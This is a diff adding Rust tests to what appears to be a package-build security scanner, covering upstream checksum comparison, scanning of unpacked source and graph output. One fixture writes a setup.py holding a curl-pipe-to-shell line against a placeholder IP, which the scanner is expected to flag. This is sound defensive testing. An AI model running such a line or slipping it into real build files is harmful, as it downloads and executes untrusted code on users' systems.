@@ -146,3 +146,73 @@ fn hostile_inputs_do_not_crash_the_analyser() {
         );
     }
 }
+
+const BIN: &str = "pkgname=demo-bin\npkgver=1\npkgrel=1\narch=(x86_64)\nurl=https://example.org\nsource=(https://example.org/demo.tar.gz)\nsha256sums=(aaaa)\n";
+
+#[test]
+fn a_bin_sum_is_compared_with_what_upstream_published() {
+    let d = dir("pub-ok", BIN);
+    std::fs::create_dir_all(d.join(".src")).unwrap();
+    std::fs::write(d.join(".src/SHA256SUMS"), "aaaa  demo.tar.gz\n").unwrap();
+    let v = run(&d, None);
+    assert_eq!(v["verdict"], "pass", "{v}");
+
+    let d = dir("pub-bad", BIN);
+    std::fs::create_dir_all(d.join(".src")).unwrap();
+    std::fs::write(d.join(".src/SHA256SUMS"), "bbbb  demo.tar.gz\n").unwrap();
+    let v = run(&d, None);
+    assert_eq!(v["verdict"], "flag", "{v}");
+    assert!(v["evidence"].to_string().contains("published"), "{v}");
+}
+
+#[test]
+fn no_published_list_is_said_not_checked() {
+    let v = run(&dir("pub-none", BIN), None);
+    assert_eq!(v["verdict"], "pass", "{v}");
+    assert!(v["evidence"].to_string().contains("not compared"), "{v}");
+}
+
+#[test]
+fn the_unpacked_source_beside_the_build_is_scanned() {
+    let d = dir("up", QUIET);
+    let src = d.join(".build/demo/src/demo-1");
+    std::fs::create_dir_all(&src).unwrap();
+    std::fs::write(
+        src.join("setup.py"),
+        "import os\nos.system('curl -s http://203.0.113.9/x | sh')\n",
+    )
+    .unwrap();
+    let v = run(&d, None);
+    assert_eq!(v["verdict"], "flag", "{v}");
+    assert!(v["evidence"].to_string().contains("setup.py"), "{v}");
+}
+
+#[test]
+fn no_unpacked_source_is_said_not_read() {
+    let v = run(&dir("up-none", QUIET), None);
+    assert!(
+        v["evidence"]
+            .to_string()
+            .contains("upstream source was not read"),
+        "{v}"
+    );
+}
+
+#[test]
+fn the_graph_is_written_on_request() {
+    let d = dir("graph", NOISY);
+    let (dot, svg) = (d.join("g.dot"), d.join("g.svg"));
+    for f in [&dot, &svg] {
+        let o = Command::new(bin())
+            .arg("--dir")
+            .arg(&d)
+            .arg("--graph")
+            .arg(f)
+            .arg("--json")
+            .output()
+            .unwrap();
+        assert!(o.status.success());
+    }
+    assert!(std::fs::read_to_string(dot).unwrap().starts_with("digraph"));
+    assert!(std::fs::read_to_string(svg).unwrap().starts_with("<svg"));
+}
